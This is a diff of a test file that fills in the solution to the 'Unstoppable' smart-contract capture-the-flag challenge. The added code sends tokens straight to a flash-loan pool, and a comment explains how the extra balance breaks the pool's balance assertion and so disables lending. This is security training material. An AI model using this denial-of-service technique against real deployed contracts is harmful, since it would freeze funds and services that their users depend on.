@@ -40,6 +40,14 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const token = this.token.connect(attacker);
+
+        await token.transfer(this.pool.address, ethers.utils.parseEther("1"));
+        /* 
+            as the pool contract uses assert(poolBalance == balanceBefore) where poolBalance is an uint256
+            that is only updated in the deposit function and balanceBefore is the total token balance of the contract
+            adding aditional tokens using a transfer is enough to break the flashLoan function
+        */
     });
 
     after(async function () {
